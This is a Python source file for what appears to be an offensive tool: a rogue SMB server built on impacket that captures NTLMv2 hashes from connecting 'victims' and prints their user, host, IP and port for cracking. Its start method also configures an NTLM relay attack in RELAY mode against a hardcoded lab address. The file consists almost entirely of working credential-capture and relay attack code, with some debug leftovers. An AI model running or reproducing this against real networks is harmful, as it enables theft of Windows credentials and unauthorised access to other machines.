from threading import Thread
from typing import List, Tuple
from impacket import smbserver
from io import StringIO
import logging
import sys

from scapy.utils import colgen
from binascii import hexlify
from .interceptlogging import InterceptHandler
from time import sleep
import re
from colorama import Fore, Style
from tabulate import tabulate


class SmbServer:
    """[ Class that contains the configuration for the smbserver ]

    Args:
        lhost (str): [ ip of the host that will start the smb server ]
        port (str): [ port for the smb server ]
        output ([type], optional): [ Output of the information collected ]. Defaults to sys.stdout.
    """

    def __init__(self, lhost: str, port: str, output=sys.stdout) -> None:
        self._lhost = lhost
        self._port = port
        self._output = output

        self.myserver = None

        self._log_stream = StringIO()  # Logging info to the stdout
        self._users_collected = []  # Users showed to the user
        self.catch_info()

    @property
    def users_collected(self) -> List[str]:
        return self._users_collected

    @users_collected.setter
    def users_collected(self, new_user: str):
        self._users_collected.append(new_user)

    @property
    def log_stream(self) -> StringIO:
        return self._log_stream

    @property
    def lhost(self) -> str:
        return self._lhost

    @property
    def port(self) -> str:
        return self._port

    @property
    def output(self):
        return self._output

    @lhost.setter
    def iface(self, lhost: str) -> None:
        self._lhost = lhost

    @port.setter
    def port(self, port: str) -> None:
        self._port = port

    @output.setter
    def output(self, output) -> None:
        self._output = output

    @log_stream.setter
    def log_stream(self, stream: StringIO) -> None:
        self._log_stream = stream

    def catch_info(self):
        """[Function to redirect the output of the class from impacket
        smbserver to loguru and log_stream]
        """
        logging.basicConfig(handlers=[InterceptHandler()], level=0)
        console = logging.StreamHandler(self.log_stream)
        console.setLevel(logging.INFO)
        logging.getLogger("").addHandler(console)

    def user_info(self, i: int, user_info_matches: str) -> Tuple[str, str]:
        """[ Function to take interesting information about the user ]

        Args:
            i (int): [ index of the current user ]
            user_info_matches (str): [ User information ]

        Returns:
            Tuple[str, str]: [ Name of the user and the name of the server ]
        """
        normalize_user_info = (
            user_info_matches[i].split()[1].replace("(", "").replace(")", "").split(",")
        )
        user = normalize_user_info[0]
        server_name = normalize_user_info[1]
        return user, server_name

    def connection_info(self, i: int, connection_info_matches: str) -> Tuple[str, str]:
        """[ Function to tkae interesting information about the connection ]

        Args:
            i (int): [ index of the current connection ]
            connection_info_matches (str): [ Connection information ]

        Returns:
            Tuple[str, str]: [ the ip of the victim and the port used ]
        """
        normalize_connection_info = (
            connection_info_matches[i]
            .split()[2]
            .replace("(", "")
            .replace(")", "")
            .split(",")
        )
        remote_ip = normalize_connection_info[0]
        remote_port = normalize_connection_info[1]
        return remote_ip, remote_port

    def color_output(self, word: str, color: Fore) -> str:
        """[ Function to color a word ]

        Args:
            word (str): [ Word to be colored ]
            color (Fore): [ Color chosen ]

        Returns:
            str: [ Colored word ]
        """
        return f"{color}{word}{Style.RESET_ALL}"

    def show_collected_info(
        self,
        i: int,
        ntlmv2_hash: str,
        user_info_matches: str,
        connection_info_matches: str,
    ) -> None:
        """[ Information of the victim ]

        Args:
            i ( int ): [ index of the current victim ]
            ntlmv2_hash (str): [ hash to be cracked  ]
            user_info_matches (str): [ user information collected from regular expresion ]
            connection_info_matches (str): [ connection information collected from regular expresion]
        """
        user, server_name = self.user_info(i, user_info_matches)
        if user not in self.users_collected:
            remote_ip, remote_port = self.connection_info(i, connection_info_matches)
            self.users_collected = user
            print(
                f'{self.color_output("USER", Fore.BLUE)} : {self.color_output(user,Fore.YELLOW)}'
            )

            print(
                f'{self.color_output("Server Name", Fore.BLUE)} : {self.color_output(server_name,Fore.YELLOW)}'
            )

            print(
                f'{self.color_output("IP", Fore.BLUE)} : {self.color_output(remote_ip,Fore.YELLOW)}'
            )

            print(
                f'{self.color_output("Remote Port", Fore.BLUE)} : {self.color_output(remote_port,Fore.YELLOW)}'
            )

            print(
                f'{self.color_output("NTLMv2", Fore.BLUE)} : {self.color_output(ntlmv2_hash,Fore.YELLOW)}'
            )
        else:
            print(
                f"{Fore.YELLOW}NTLMv2 hash of user {user} shown above{Style.RESET_ALL}"
            )

    def generate_output(self) -> None:
        """[ Collected information of the targets ]"""
        pattern_for_ntlmv2_hash = re.compile(r".*::.*")
        pattern_for_user_info = re.compile(r"AUTHENTICATE_MESSAGE .*")
        pattern_for_connection_info = re.compile(r"Incoming connection .*")

        ntlmv2_matches = pattern_for_ntlmv2_hash.findall(self.log_stream.getvalue())
        connection_info_matches = pattern_for_connection_info.findall(
            self.log_stream.getvalue()
        )
        user_info_matches = pattern_for_user_info.findall(self.log_stream.getvalue())

        for i, ntlmv2_hash in enumerate(ntlmv2_matches):
            self.show_collected_info(
                i, ntlmv2_hash, user_info_matches, connection_info_matches
            )

    def show_ntlmv2(self) -> None:
        """[ Function to show the information collected in log_stream ]"""
        while True:
            sleep(2)
            if self.log_stream.getvalue() != "":
                self.generate_output()
            self.log_stream.truncate(0)
            self.log_stream.seek(0)

    def show_server_info(self) -> None:
        while True:
            print("Info para probar cosas")
            sleep(2)
            # print(self.myserver.__server.)
            self.myserver.setSMBChallenge("12345678abcdef00")
            print(self.myserver._SimpleSMBServer__server.getServerOS())
            print(self.myserver._SimpleSMBServer__server.getActiveConnections())
            connections = self.myserver._SimpleSMBServer__server.getActiveConnections()
            for key, value in connections.items():
                ip = value["ClientIP"]
                print(key)
                print(type(value))
                print(
                    hexlify(value["AUTHENTICATE_MESSAGE"].getData()).decode("latin-1")
                )
                print(hexlify(value["CHALLENGE_MESSAGE"]["challenge"]))
            # print(
            #    self.myserver._SimpleSMBServer__server.getActiveConnections()[key][
            #        "AUTHENTICATE_MESSAGE"
            #    ]["challenge"]
            # )

    def start_smbserver(self) -> None:
        """[ Function to start the smb server ]"""
        import logging
        from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
        from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
        from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
        from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
        from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
        from impacket.examples.logger import init

        init(False)
        Ataques = {"SMB": SMBAttack}
        Clientes = {"SMB": SMBRelayClient}
        target = TargetsProcessor(
            singleTarget="192.168.253.129",
            protocolClients=Clientes,
        )

        config = NTLMRelayxConfig()
        config.setMode("RELAY")
        config.target = target
        config.setAttacks(Ataques)
        config.setProtocolClients(Clientes)
        config.setSMB2Support(True)
        config.interfaceIp = "192.168.253.135"
        server = SMBRelayServer(config)
        server.start()
        server.join()
        print("hola")

        """
        show_ntlmv2_thread = Thread(target=self.show_ntlmv2)
        show_ntlmv2_thread.daemon = True
        show_ntlmv2_thread.start()

        more_info_thread = Thread(target=self.show_server_info)
        more_info_thread.daemon = True
        more_info_thread.start()
        
        self.myserver = smbserver.SimpleSMBServer(
            listenAddress=self.lhost, listenPort=int(self.port)
        )
        self.myserver.setSMBChallenge("")
        self.myserver.start()
        """
